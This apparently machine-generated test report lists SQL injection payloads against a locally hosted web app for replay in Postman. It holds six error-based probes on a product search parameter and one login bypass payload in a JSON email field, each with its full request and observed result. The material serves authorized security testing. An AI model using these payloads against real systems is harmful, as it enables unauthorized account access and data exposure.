# Postman SQLi Payload Tests

These payloads came from confirmed local probe evidence in `agent_results.json`.
Use them only against an authorized local target through the configured proxy.

## 1. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='a`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27a`

## 2. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='b`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27b`

## 3. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='c`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27c`

## 4. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='d`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27d`

## 5. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='e`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27e`

## 6. GET /rest/products/search

- Endpoint type: `search`
- Attack style: `string_search_error_probe`
- Vulnerable parameter: `q` in `query`
- Payload: ` OR 'a'='g`
- Observed signal: `sql_error`
- Evidence: Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id="stacktrace"></ul>     </div>   </body> </html> 

Postman setup:
- Method: `GET`
- URL: `http://127.0.0.1:8080/rest/products/search?q=+OR+%27a%27%3D%27g`

## 7. POST /rest/user/login

- Endpoint type: `auth_login`
- Attack style: `auth_boolean_bypass`
- Vulnerable parameter: `email` in `json`
- Payload: `' OR '' = '' --`
- Observed signal: `authentication_bypass`
- Evidence: Baseline returned 401, probe returned 200 with authentication data.

Postman setup:
- Method: `POST`
- URL: `http://127.0.0.1:8080/rest/user/login`
- Header: `Content-Type: application/json`
- Body:

```json
{
  "email": "' OR '' = '' --",
  "password": "agent_baseline"
}
```
